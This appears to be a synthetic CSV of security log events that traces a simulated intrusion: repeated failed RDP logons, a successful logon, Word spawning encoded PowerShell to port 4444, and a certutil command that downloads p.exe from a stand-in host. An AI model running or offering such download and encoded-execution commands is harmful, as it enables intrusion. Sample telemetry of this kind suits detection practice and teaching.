_time,src_ip,dst_ip,action,EventCode,dest_port,ParentImage,Image,CommandLine,bytes_out,hash
2024-03-15 14:30:01,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:05,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:09,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:13,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:17,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:21,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:25,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:29,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:33,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:37,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:41,203.0.113.50,10.0.0.5,BLOCKED,4625,3389,,,,,
2024-03-15 14:30:45,203.0.113.50,10.0.0.5,ALLOWED,4624,3389,,,,,
2024-03-15 14:31:02,10.0.0.5,203.0.113.50,ALLOWED,4688,4444,C:\Program Files\Microsoft Office\WINWORD.EXE,powershell.exe,powershell -enc JABIAE0A,500,
2024-03-15 14:31:30,10.0.0.5,203.0.113.99,ALLOWED,4688,443,explorer.exe,cmd.exe,cmd /c certutil -urlcache -f http://evil.xyz/p.exe,150000000,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
